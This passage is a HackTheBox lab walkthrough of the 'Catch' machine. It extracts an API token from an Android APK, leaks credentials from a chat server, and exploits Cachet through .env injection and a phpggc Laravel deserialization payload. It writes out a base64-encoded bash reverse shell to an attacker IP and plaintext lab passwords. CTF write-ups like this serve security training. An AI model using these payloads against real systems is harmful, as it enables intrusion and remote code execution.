---
title: HTB: Catch
url: https://0xdf.gitlab.io/2022/07/23/htb-catch.html
date: 2022-07-23T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-catch, nmap, apk, android, feroxbuster, gitea, swagger, lets-chat, cachet, jadx, mobsf, api, cve-2021-39172, burp, burp-repeater, wireshark, redis, php-deserialization, deserialization, phpggc, laravel, cve-2021-39174, cve-2021-39165, sqli, ssti, sqlmap, docker, bash, command-injection, apktool, htb-routerspace, flare-on-flarebear
---

![Catch](https://0xdfimages.gitlab.io/img/catch-cover.png)

Catch requires finding an API token in an Android application, and using that to leak credentials from a chat server. Those credentials provide access to multiple CVEs in a Cachet instance, providing several different paths to a shell. The intended and most interesting is to inject into a configuration file, setting my host as the redis server, and storing a malicious serialized PHP object in that server to get execution. To escalate to root, I’ll abuse a command injection vulnerability in a Bash script that is checking APK files by giving an application a malicious name field.

## Box Info

| Name | [Catch](https://hackthebox.com/machines/catch)  [Catch](https://hackthebox.com/machines/catch) [Play on HackTheBox](https://hackthebox.com/machines/catch) |
| --- | --- |
| Release Date | [12 Mar 2022](https://twitter.com/hackthebox_eu/status/1501951132108615681) |
| Retire Date | 23 Jul 2022 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Catch |
| Radar Graph | Radar chart for Catch |
| First Blood User | 00:44:14[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| First Blood Root | 00:46:12[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` finds five open TCP ports, SSH (22) and four HTTP servers (80, 3000, 5000, 8000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.150                                                     
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-11 20:41 UTC
Nmap scan report for 10.10.11.150
Host is up (0.090s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds
oxdf@hacky$ nmap -p 22,80,3000,5000,8000 -sCV 10.10.11.150
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-11 20:43 UTC
Nmap scan report for 10.10.11.150
Host is up (0.089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Catch Global Systems
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close                                                        
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=11f4bcc216e281a0; Path=/; HttpOnly
|     Set-Cookie: _csrf=TqeCOMxg0eXNRMeRtlBTI5MB66E6MTY1NDk4MDE5NDk5MzE4MjQ4Mw;
...[snip]...
5000/tcp open  upnp?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge:                                                       
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 302 Found
|     X-Frame-Options: SAMEORIGIN
|     X-Download-Options: noopen
...[snip]...
8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Catch Global Systems
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.80%I=7%D=6/11%Time=62A4FE5E%P=x86_64-pc-linux-gnu%r(Ge 
...[snip]...
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"H
SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.91 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) (TCP 80) versions, the host is likely running Ubuntu 20.04 focal.

### Website - TCP 80

#### Site

The website on TCP 80 is for Catch Global Systems:

![image-20220628165934096](https://0xdfimages.gitlab.io/img/image-20220628165934096.png)

None of the links on the page lead anywhere, except for the “Download Now” button, which downloads `catchv1.0.apk`.

#### Tech Stack

The response headers don’t give much info at all. Guessing at the index page, it does return as `index.php`, which is a bit surprising as the page looks very static.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.150 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.150
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      374l      602w     6163c http://10.10.11.150/
403      GET        9l       28w      277c http://10.10.11.150/.php
301      GET        9l       28w      317c http://10.10.11.150/javascript => http://10.10.11.150/javascript/
200      GET      374l      602w     6163c http://10.10.11.150/index.php
403      GET        9l       28w      277c http://10.10.11.150/server-status
[####################] - 2m    180000/180000  0s      found:5       errors:154    
[####################] - 2m     60000/60000   469/s   http://10.10.11.150 
[####################] - 2m     60000/60000   467/s   http://10.10.11.150/ 
[####################] - 2m     60000/60000   480/s   http://10.10.11.150/javascript 

```

Nothing interesting here.

### Gitea - TCP 3000

#### Site

There’s a custom Gitea instance on TCP 3000:

![image-20220628170956050](https://0xdfimages.gitlab.io/img/image-20220628170956050.png)

The bottom does has a Gitea version, 1.14.1, but I don’t find any vulnerabilities in this version that would have existed at Catches creation.

They call it “Catch Repositories”. Without an account, there’s not much to find. Under “Explore”, in the “Users” tab, there’s a single user, root:

![image-20220628171045367](https://0xdfimages.gitlab.io/img/image-20220628171045367.png)

Trying to visit the interactive Swagger API docs typically found with Gitea (link at the bottom of the page) just loads an empty page:

![image-20220628172719111](https://0xdfimages.gitlab.io/img/image-20220628172719111.png)

Looking at the link, it points to `http://gitea.catch.htb:3000`. I’ll add that to my `/etc/hosts` file, and start a subdomain brute force in the background, but it doesn’t find anything interesting.

Reloading the page as `http://gitea.catch.htb:3000/api/swagger` loads the docs:

[![image-20220720204716788](https://0xdfimages.gitlab.io/img/image-20220720204716788.png)](https://0xdfimages.gitlab.io/img/image-20220720204716788.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220720204716788.png)

#### Tech Stack

The HTTP headers have no `Server` header, which suggests perhaps it’s not using the same Apache service:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
X-Frame-Options: SAMEORIGIN
Date: Tue, 28 Jun 2022 21:09:50 GMT
Connection: close
Content-Length: 12125

```

My guess would be perhaps the Gitea container running in Docker. I won’t bother brute forcing here since it’s a known software.

The bottom right side of the footer on the page does identify it as version 1.14.1. That was released almost a [year before](https://blog.gitea.io/2021/04/gitea-1.14.1-is-released/) Catch was released on HTB. I don’t see any obvious vulnerabilities in this version.

### Let’s Chat - TCP 5000

#### Site

The site on TCP 5000 calls itself “Let’s Chat”:

![image-20220628171409642](https://0xdfimages.gitlab.io/img/image-20220628171409642.png)

#### Tech Stack

Just like Gitea, no `Server` header:

```

HTTP/1.1 302 Found
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: 
X-UA-Compatible: IE=Edge,chrome=1
Location: /login
Vary: Accept, Accept-Encoding
Content-Type: text/html; charset=utf-8
Content-Length: 56
Set-Cookie: connect.sid=s%3AJhCVmtNrNmQfJxFx-CwQulwBD5dJXK5u.ISA4tmHWA8a1%2FIMpPzR4o7lxwoUPPYk3Ln4HZxeMSiY; Path=/; HttpOnly
Date: Tue, 28 Jun 2022 21:13:16 GMT
Connection: close

```

At the bottom right of the page, there is a link to the [GitHub](https://github.com/sdelements/lets-chat) project for Let’s Chat. It looks to be a NodeJS application. If I had to guess, I’d say this is likely another Docker container, but don’t know this for sure.

I don’t see any public vulnerabilities in this software.

### Cachet - TCP 8000

#### Site

This page provides a list of incident reports:

[![image-20220628172137885](https://0xdfimages.gitlab.io/img/image-20220628172137885.png)](https://0xdfimages.gitlab.io/img/image-20220628172137885.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220628172137885.png)

At the bottom of the page, there’s two links. “Subscribe” returns a 500 error. “Dashboard” redirects to `/auth/login` and presents a form:

![image-20220628172324304](https://0xdfimages.gitlab.io/img/image-20220628172324304.png)

#### Tech Stack

At the bottom of the main page and over the login form both reference Cachet. [Cachet](https://cachethq.io/) is an open source status page system. Looking through their docs, it is built on PHP.

The HTTP headers show not only PHP, but also the Laravel framework:

```

HTTP/1.1 200 OK
Date: Tue, 28 Jun 2022 21:20:32 GMT
Server: Apache/2.4.29 (Ubuntu)
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IlR4R1ZPQVRxS1h5TG5wUUwwU2JCOEE9PSIsInZhbHVlIjoiNFhPNnl1dTZ4SENkVWJ6QVdWRXdIZWZCU0xuSzhnMnViOERnXC9zR1hOWmIxYjZrYVhwaXUrZDZkNllYUTlZTW8iLCJtYWMiOiI4MDQ0NjM1YWZhMDNmOWNkNDU2YTliZDhhNzIxNjQzZjkzNGQxYTI3MmY0MzBjNjgyZWRlYTg0ZjMxNmZlNjRlIn0%3D; expires=Tue, 28-Jun-2022 23:20:32 GMT; Max-Age=7200; path=/
Set-Cookie: laravel_session=eyJpdiI6IkVWbmpBblVyWWthNjlmaHNsT3AwMHc9PSIsInZhbHVlIjoiQmNLNU9IenltZ2gybnMzTVVFOTRNTWJBTDZSOHlPbW5YVUhsbTZVREdWcTQwXC81YlY1RjJKZEdPYmRDdEVvXC9aIiwibWFjIjoiZWM3MWE1NmMzNjIyMTE2ZTNlOGQ1NjI5MjBiODliYWJhMmU2MmMxMDBjMzJlYWM4ODZiMzNmMWUxYzlhOWIxMSJ9; expires=Tue, 28-Jun-2022 23:20:32 GMT; Max-Age=7200; path=/; httponly
Vary: Accept-Encoding
Content-Length: 8869
Connection: close
Content-Type: text/html; charset=UTF-8

```

#### Exploits

I am able to identify a few exploits against Cachet:
- [Unauthenticated SQL Injection](https://github.com/advisories/GHSA-79mg-4w23-4fqc) in Version <= 2.3.18 and dev 2.4. [CVE-2021-39165]
- SSTI vulnerability, shown by the author of CVE-2021-39165. [No CVE]
- Two RCE vulnerabilities and an information leak in 2.4, all described in [this post](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/). [CVE-2021-39172, CVE-2021-39173, and CVE-2021-39174]

I’ll abuse all of these below.

### APK Reversing

#### Jadx

Recently I showed using `apktool` to decompile an Android APK in [RouterSpace](/2022/07/09/htb-routerspace.html#routerspaceapk---static). I’ll use [Jadx](https://github.com/skylot/jadx/releases) to open the Android `.apk` file this time (I did show this in 2019 for the [Flarebear](/flare-on-2019/flarebear.html#re) Flare-On challenge). After unzipping the release and running `bin/jadx-gui`, I’ll open `catchv1.0.apk`. It shows the structure of the application:

![image-20220628174533116](https://0xdfimages.gitlab.io/img/image-20220628174533116.png)

There’s a *ton* of files, but starting with the `AndroidManifest.xml` file will help orient:

```

<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="32" android:compileSdkVersionCodename="12" package="com.example.acatch" platformBuildVersionCode="32" platformBuildVersionName="12">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="32"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <application android:theme="@style/Theme_Catch" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:allowBackup="true" android:supportsRtl="true" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <activity android:name="com.example.acatch.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>

```

It shows the entry point at `com.example.acatch.MainActivity`. This class is pretty simple. It’s using the `WebView` class to load the status page:

![image-20220628175210998](https://0xdfimages.gitlab.io/img/image-20220628175210998.png)

It is referring to `status.catch.htb` without specifying a port, and using `https`. So it’s not directly connecting to the status page on Catch.

I’ll not find much else here looking at the code manually.

#### MobSF

The [Mobile Security Framework](https://github.com/MobSF/Mobile-Security-Framework-MobSF) provides an awesome environment for analyzing mobile binaries like `.apk` files.

I’ll download it with `git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git` , and then run the `setup.sh` script. Then I’ll run `run.sh`, and it starts on localhost TCP 8000. Visiting that offers the chance to upload a binary:

![image-20220628180138891](https://0xdfimages.gitlab.io/img/image-20220628180138891.png)

I’ll give it `catchv1.0.apk`, and after a minute, it returns a very long report:

![image-20220628180456615](https://0xdfimages.gitlab.io/img/image-20220628180456615.png)

Towards the bottom, it shows “Hardcoded Secrets”:

![image-20220628180421703](https://0xdfimages.gitlab.io/img/image-20220628180421703.png)

It seems like some of the author’s tokens got embedded into the application. I don’t yet have a Slack instance, so I’ll put that token aside for now.

I’ll try the `gitea_token` in the Swagger docs, by adding it to the `AuthorizationHeaderToken` section:

![image-20220628181239387](https://0xdfimages.gitlab.io/img/image-20220628181239387.png)

When I try to execute `/user`, it returns that the token is invalid:

![image-20220628181428559](https://0xdfimages.gitlab.io/img/image-20220628181428559.png)

It seems this isn’t a valid token.

I’ll abuse the Let’s Chat token below.

## Multiple Paths

There are several neat paths to show for between enumeration and getting a shell on the host system as will:

[![](https://0xdfimages.gitlab.io/img/Catch-Flow-16565201861694.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/Catch-Flow-16565201861694.png)

## Shell as will [Intended]

### Access to Cachet

#### Let’s Chat API Access

The [docs](https://github.com/sdelements/lets-chat/wiki/API%3A-Authentication) for the Let’s Chat API suggest that tokens can be used either as Basic Auth by setting the token to the username, or as a Bearer Token. Given that Bearer Token authentication is simpler, I’ll try that first.

The API is broken down into “Rooms”, “Messages”, “Files”, “Users”, and “Account”. I’ll start with `/rooms`, which should return a list of the chat rooms. Trying this without the token returns unauthorized:

```

oxdf@hacky$ curl http://10.10.11.150:5000/rooms 
Unauthorized

```

I’ll use the token from the Android application as an `Authorization` header, and pipe into `jq` to make the output pretty:

```

oxdf@hacky$ export token=NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==
oxdf@hacky$ curl -s http://10.10.11.150:5000/rooms -H "Authorization: Bearer $token" | jq .
[
  {
    "id": "61b86b28d984e2451036eb17",
    "slug": "status",
    "name": "Status",
    "description": "Cachet Updates and Maintenance",
    "lastActive": "2021-12-14T10:34:20.749Z",
    "created": "2021-12-14T10:00:08.384Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b8708efe190b466d476bfb",
    "slug": "android_dev",
    "name": "Android Development",
    "description": "Android App Updates, Issues & More",
    "lastActive": "2021-12-14T10:24:21.145Z",
    "created": "2021-12-14T10:23:10.474Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b86b3fd984e2451036eb18",
    "slug": "employees",
    "name": "Employees",
    "description": "New Joinees, Org updates",
    "lastActive": "2021-12-14T10:18:04.710Z",
    "created": "2021-12-14T10:00:31.043Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  }
]

```

#### Enumerate Chat

There are three rooms, “status”, “android\_dev”, and “employees”. `/rooms/[room id]/messages` will return the messages. I’ll use some `jq` foo to print the message and author id:

```

oxdf@hacky$ curl -s http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -H "Authorization: Bearer $token" | jq -c '. | reverse | .[] | [.text, .owner]'
["Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. ","61b86f15fe190b466d476bf5"]
["Can you create an account for me ? ","61b86dbdfe190b466d476bf0"]
["Sure one sec.","61b86f15fe190b466d476bf5"]
["Here are the credentials `john :  E}V!mywu_69T4C}W`","61b86f15fe190b466d476bf5"]
["@john is it possible to add SSL to our status domain to make sure everything is secure ? ","61b86aead984e2451036eb16"]
["Why not. We've this in our todo list for next quarter","61b86dbdfe190b466d476bf0"]
["Excellent! ","61b86aead984e2451036eb16"]
["Also make sure we've our systems, applications and databases up-to-date.","61b86dbdfe190b466d476bf0"]
["You should actually include this task to your list as well as a part of quarterly audit","61b86aead984e2451036eb16"]
["ah sure!","61b86dbdfe190b466d476bf0"]

```

The user 61b86f15fe190b466d476bf5 makes some credentials for john! They don’t work over SSH:

```

oxdf@hacky$ sshpass -p 'E}V!mywu_69T4C}W' ssh john@10.10.11.150
Permission denied, please try again.

```

But they do work to log into the Cachet instance on port 8000:

![image-20220628183207080](https://0xdfimages.gitlab.io/img/image-20220628183207080.png)

I’ll get the messages from the other rooms, but nothing super interesting.

### Shell as www-data in Container

#### CVE-2021-39172 Background

[This post](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/) from SonarSource goes into detail on three CVEs, including CVE-2021-39172, which provides remote code execution. The idea is to abuse the view used to update configuration details which end up in the `.env` file used by Laravel. While only certain values are allowed to be changed, but sending a value with newlines in it, the attacker is able to add additional values to the file. In Laravel, the first instance of a variable in the `.env` file is used, so as long as legit value being abused it above the target value in the file, the attacker’s version will be utilized.

The suggested exploit is to change the `CACHE_DRIVER` key to a Redis server under the attacker’s control. In that Redis server, I’ll cache a serialized PHP attack payload that will result in execution when the server connects and deserializes the payload.

#### Update .env

To exploit this, I’ll go to “Settings” > “Mail”, and click “Save”:

![image-20220629123929419](https://0xdfimages.gitlab.io/img/image-20220629123929419.png)

In Burp, I’ll find that request and send it to Repeater. The body of the POST shows the different items that are to be updated in the `.env` file:

![image-20220629124225233](https://0xdfimages.gitlab.io/img/image-20220629124225233.png)

I’ll change the `config[mail_driver]` to `config[cache_driver]` and change `log` to:

```

file
REDIS_HOST=10.10.14.6
REDIS_PORT=6379
SESSION_DRIVER=redis

```

On sending this, I’ve injected three new configurations into the `.env` file.

I’ll open WireShark and filter on `tcp.port==6379`. If I browse to the login page in a private browsing window (no cookies), I’ll see traffic as a new session is created:

![image-20220629132544985](https://0xdfimages.gitlab.io/img/image-20220629132544985.png)

It’s worth noting that this config change gets reset pretty quickly, which is likely some kind of cleanup script to allow for multiple players to exploit this at the same time on the same host.

#### Configure Redis

I’ll need a copy of a Redis server locally to exploit this. I’ll install it with `sudo apt install redis-server -y` . I don’t want this to run regularly, so I’ll stop and disable the service (`sudo systemctl stop redis-server` and `sudo systemctl disable redis-server`), and run it in the foreground from the command line. I’ll start the server with `--protected-mode no` so that it listens on more than just local host:

```

oxdf@hacky$ redis-server --protected-mode no
95298:C 29 Jun 2022 16:49:58.756 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
95298:C 29 Jun 2022 16:49:58.756 # Redis version=5.0.7, bits=64, commit=00000000, modified=0, pid=95298, just started
...[snip]...

```

Now it’s listening on all interfaces:

```

oxdf@hacky$ sudo netstat -tnlp | grep 6379
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      95298/redis-server  
tcp6       0      0 :::6379                 :::*                    LISTEN      95298/redis-server

```

I’ll connect to this server, and see there are no keys:

```

oxdf@hacky$ redis-cli 
127.0.0.1:6379> keys *
(empty list or set)

```

If I re-poison the `.env` (it’s timed out by now), and then refresh the login page in the private window, there’s now a session cached:

```
127.0.0.1:6379> keys *
1) "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"
127.0.0.1:6379> get "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"
"s:197:\"a:3:{s:6:\"_token\";s:40:\"R53GMtfMIuQmJIF3YtfQO31InoSm4faU3FtZmGJ9\";s:9:\"_previous\";a:1:{s:3:\"url\";s:39:\"http://status.catch.htb:8000/auth/login\";}s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}}\";"

```

I’ll recognize that result as a serialized PHP object.

#### POC

[PHP Generic Gadget Chains](https://github.com/ambionics/phpggc), or `phpggc`, is a tool for creating serialized attack payloads. I’ll `git clone` it into my `/opt` directory.

There’s a bunch of payloads for Laravel:

```

oxdf@hacky$ /opt/phpggc/phpggc -l | grep -i laravel
Laravel/RCE1                              5.4.27                             RCE (Function call)    __destruct          
Laravel/RCE10                             5.6.0 <= 9.1.8+                    RCE (Function call)    __toString          
Laravel/RCE2                              5.4.0 <= 8.6.9+                    RCE (Function call)    __destruct          
Laravel/RCE3                              5.5.0 <= 5.8.35                    RCE (Function call)    __destruct     *    
Laravel/RCE4                              5.4.0 <= 8.6.9+                    RCE (Function call)    __destruct          
Laravel/RCE5                              5.8.30                             RCE (PHP code)         __destruct     *    
Laravel/RCE6                              5.5.* <= 5.8.35                    RCE (PHP code)         __destruct     *    
Laravel/RCE7                              ? <= 8.16.1                        RCE (Function call)    __destruct     *    
Laravel/RCE8                              7.0.0 <= 8.6.9+                    RCE (Function call)    __destruct     *    
Laravel/RCE9                              5.4.0 <= 9.1.8+                    RCE (Function call)    __destruct

```

These are all payloads that will make use of functions available in the application to get code running on deserialization.

On the GitHub page for Cachet, there’s a couple references to Laravel:

[![image-20220629133553627](https://0xdfimages.gitlab.io/img/image-20220629133553627.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220629133553627.png)

These imply that it’s using at least Laravel 5.7. `Laravel/RCE4` seems to cover the range I’m targeting (5.4.0 <= 8.6.9+), so I’ll build a payload to run `id`:

```

oxdf@hacky$ /opt/phpggc/phpggc -a Laravel/RCE4 system id
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:2:"id";}

```

I’ll get a fresh session in the cache, and update it:

```
127.0.0.1:6379> keys *
1) "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"
127.0.0.1:6379> set "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34" 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:2:"id";}'
OK

```

Now when I refresh that login page again:

![image-20220629133839361](https://0xdfimages.gitlab.io/img/image-20220629133839361.png)

RCE!

#### Shell

I’ll base64-encode a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) adding a couple extra spaces to get rid of `/` and `=` characters):

```

oxdf@hacky$ echo "bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 " | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK

```

I don’t need the `bash -c '[payload]'` because I’m going to pipe it into `bash` after decoding.

I’ll encode that into a PHP object:

```

oxdf@hacky$ /opt/phpggc/phpggc -a Laravel/RCE4 system "echo 'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK'|base64 -d|bash"
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:78:"echo 'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK'|base64 -d|bash";}

```

I’ll re-poison the `.env` file, and refresh the page to get a session in Redis:

```
10.10.14.6:6379> keys *
1) "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"

```

I’ll update it to the payload:

```
10.10.14.6:6379> set "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34" 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:78:"echo 'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK'|base64 -d|bash";}'
Invalid argument(s)

```

It fails, because there a `'` in the payload and wrapping the full thing. I’ll go back and escape the `'` with a `\`. Now it works:

```
10.10.14.6:6379> set "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34" 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:78:"echo \'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK\'|base64 -d|bash";}'
OK

```

I’ll refresh the page, and it hangs. There’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.150 35616
bash: cannot set terminal process group (26): Inappropriate ioctl for device
bash: no job control in this shell
www-data@70e4165dab0b:/var/www/html/Cachet/public$

```

I’ll upgrade my shell with `script` and `stty` ([shell upgrade explained](https://www.youtube.com/watch?v=DqE6DxqJg8Q)):

```

www-data@70e4165dab0b:/var/www/html/Cachet/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@70e4165dab0b:/var/www/html/Cachet/public$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@70e4165dab0b:/var/www/html/Cachet/public$

```

### Shell as will on host

#### Enumeration

It’s clear based the hostname that I’m not on the host:

```

www-data@70e4165dab0b:/var/www/html/Cachet/public$ hostname
70e4165dab0b

```

The IP is 172.17.0.8:

```

www-data@70e4165dab0b:/$ ifconfig
bash: ifconfig: command not found
www-data@70e4165dab0b:/$ ip addr 
bash: ip: command not found
www-data@70e4165dab0b:/$ cat /proc/net/fib_trie        
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
...[snip]...
           |-- 172.17.0.8
              /32 host LOCAL
...[snip]...

```

The `.env` file is in `/var/www/html/Cachet`:

```

www-data@70e4165dab0b:/var/www/html/Cachet$ cat .env 
APP_ENV=production
APP_DEBUG=false
...[snip]...

```

If I poison the file again, I can see where my payload is inserted, taking precedence over the legit values:

[![image-20220629140604591](https://0xdfimages.gitlab.io/img/image-20220629140604591.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220629140604591.png)

There’s also DB creds for a user will:

```

DB_DRIVER=mysql
DB_HOST=localhost
DB_UNIX_SOCKET=null
DB_DATABASE=cachet
DB_USERNAME=will
DB_PASSWORD=s2#4Fg0_%3!
DB_PORT=null
DB_PREFIX=null

```

#### SSH

These creds work to SSH to the host:

```

oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' ssh will@10.10.11.150
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
...[snip]...
will@catch:~$

```

And grab `user.txt`:

```

will@catch:~$ cat user.txt
d081fca8************************

```

## Shell as will [Alt #1]

I’ll use the same techniques [above](#access-to-cachet) to access Cachet as john. But this time, I’ll use the info leak CVE to get the environment variables directly, skipping the need for RCE in the container:

[![](https://0xdfimages.gitlab.io/img/Catch-Flow-alt-1-16583671250132.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/Catch-Flow-alt-1-16583671250132.png)

### CVE-2021-39174

This CVE is described in detail in the [same SonarSource blog](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/) post. It’s quite simple. Looking at the same form to change the mail config, if something in the `.env` is stored as `${NAME}`, then it will reference a previously defined name. Following the example in the post, I’ll set the Mail Host to `${DB_USERNAME}` and the Mail from Address to `${DB_PASSWORD}`. On refreshing:

![image-20220629142517960](https://0xdfimages.gitlab.io/img/image-20220629142517960.png)

This was a bit finicky. For reasons I can’t explain, I would often have to set this several times to get it to work.

### SSH

Just like above, I can use those creds to get a shell:

```

oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' ssh will@10.10.11.150
